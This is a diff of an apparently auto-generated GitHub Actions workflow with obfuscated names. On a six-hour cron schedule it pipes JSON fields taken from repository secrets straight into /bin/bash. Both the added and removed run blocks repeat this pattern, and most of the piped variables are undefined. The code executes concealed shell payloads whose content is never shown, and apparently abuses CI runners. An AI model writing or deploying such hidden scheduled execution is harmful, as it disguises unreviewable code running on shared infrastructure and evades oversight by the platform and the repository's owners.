@@ -3,27 +3,25 @@ name: hotdogequal
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 3/6 * * *'
-jobs:  # 5781
+    - cron: '41 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: hotdogequal
         env:
-          uqfm7: ${{ secrets.uqfm7 }}
+          vq3: ${{ secrets.vq3 }}
         run: |
-          echo $uqfm7 | jq -r .t04606 | /bin/bash
-          echo $xldm13762 | jq -r .hlleo8017 | /bin/bash
-          echo $ingcn34 | jq -r .elec625 | /bin/bash
-          echo $fe755 | jq -r .lc50 | /bin/bash
-          echo $vw38 | jq -r .txi0 | /bin/bash
-          echo $atngo6633 | jq -r .rn45 | /bin/bash
-          echo $knxsk42861 | jq -r .lwvi5125 | /bin/bash
-          echo $csu3333 | jq -r .mqng73206 | /bin/bash
-          echo $zls71978 | jq -r .slbwb4938 | /bin/bash
-          echo $oux77237 | jq -r .l3286 | /bin/bash
-          echo $ioqgv926 | jq -r .l4574 | /bin/bash
-          echo $pmp64603 | jq -r .xv696 | /bin/bash
-          echo $onvsg4454 | jq -r .vxcv77 | /bin/bash
+          echo $vq3 | jq -r .tnhxa450 | /bin/bash
+          echo $ilth4447 | jq -r .jgbag66290 | /bin/bash
+          echo $czqh5 | jq -r .xenxo3 | /bin/bash
+          echo $bomq3 | jq -r .q1 | /bin/bash
+          echo $kdwm7102 | jq -r .ho4761 | /bin/bash
+          echo $zrdes603 | jq -r .hyfq64808 | /bin/bash
+          echo $pwauz7 | jq -r .jha258 | /bin/bash
+          echo $clb6670 | jq -r .sml3720 | /bin/bash
+          echo $sa38 | jq -r .jsnx1018 | /bin/bash
+          echo $ic9074 | jq -r .v0335 | /bin/bash
 
